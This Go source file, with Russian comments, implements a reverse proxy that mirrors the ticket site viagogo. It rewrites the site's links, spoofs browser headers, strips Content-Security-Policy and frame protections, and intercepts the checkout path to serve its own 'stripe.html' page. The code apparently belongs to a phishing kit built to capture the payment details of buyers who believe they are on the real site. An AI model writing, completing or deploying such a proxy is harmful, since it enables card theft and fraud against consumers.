package proxy

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"trsast/config"
)

type ProxyHandler struct {
    cfg        *config.Config
    client     *http.Client
    targetURL  *url.URL
    rewriter   *Rewriter
    checkout   *CheckoutHandler
}

func NewProxyHandler(cfg *config.Config) (*ProxyHandler, error) {
    targetURL, err := url.Parse(cfg.TargetScheme + "://" + cfg.TargetHost)
    if err != nil {
        return nil, err
    }

    // Прямое соединение (без прокси) для теста
    transport := &http.Transport{
        TLSClientConfig: &tls.Config{
            MinVersion: tls.VersionTLS12,
            ServerName: cfg.TargetHost,
        },
        MaxIdleConns:        100,
        MaxIdleConnsPerHost: 20,
        IdleConnTimeout:     90,
    }

    client := &http.Client{
        Transport: transport,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Не ходим по редиректам сами
        },
    }

    return &ProxyHandler{
        cfg:       cfg,
        client:    client,
        targetURL: targetURL,
        rewriter:  NewRewriter(cfg),
        checkout:  NewCheckoutHandler(cfg),
    }, nil
}

func (p *ProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // Перехват чекаута
    if p.checkout.ShouldIntercept(r.URL.Path) {
        p.checkout.HandleCheckout(w, r)
        return
    }

    // Статические файлы (наш stripe.html и т.д.)
    if strings.HasPrefix(r.URL.Path, "/static/") {
        http.StripPrefix("/static/", http.FileServer(http.Dir("static"))).ServeHTTP(w, r)
        return
    }

    p.proxyRequest(w, r)
}

func (p *ProxyHandler) proxyRequest(w http.ResponseWriter, r *http.Request) {
    // Строим URL для запроса к viagogo
    proxyURL := *p.targetURL
    proxyURL.Path = r.URL.Path
    proxyURL.RawQuery = r.URL.RawQuery

    // Создаём запрос
    proxyReq, err := http.NewRequest(r.Method, proxyURL.String(), r.Body)
    if err != nil {
        http.Error(w, "Bad Gateway", http.StatusBadGateway)
        return
    }

    // Копируем заголовки от клиента, кроме проблемных
    copyHeaders(r.Header, proxyReq.Header)
    proxyReq.Header.Set("Host", p.cfg.TargetHost)
    proxyReq.Header.Set("Referer", p.targetURL.String()+"/")
    // Ставим нормальный User-Agent
    proxyReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
    proxyReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
    proxyReq.Header.Del("Accept-Encoding") // Чтобы не сжимал, проще парсить

    // Отправляем
    resp, err := p.client.Do(proxyReq)
    if err != nil {
        http.Error(w, "Bad Gateway", http.StatusBadGateway)
        return
    }
    defer resp.Body.Close()

    // Читаем тело
    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        http.Error(w, "Bad Gateway", http.StatusBadGateway)
        return
    }

    // Подменяем ссылки в ответе
    contentType := resp.Header.Get("Content-Type")
    modifiedBody := p.rewriter.RewriteBody(bodyBytes, contentType)

    // Копируем заголовки ответа, подменяем что надо
    copyHeaders(resp.Header, w.Header())
    w.Header().Set("Content-Length", fmt.Sprintf("%d", len(modifiedBody)))
    // Снимаем ограничения безопасности, которые мешают
    w.Header().Del("Content-Security-Policy")
    w.Header().Del("X-Frame-Options")
    w.Header().Del("X-Content-Type-Options")

    // Отдаём статус и тело
    w.WriteHeader(resp.StatusCode)
    w.Write(modifiedBody)
}

func copyHeaders(src, dst http.Header) {
    for key, values := range src {
        for _, v := range values {
            dst.Add(key, v)
        }
    }
}
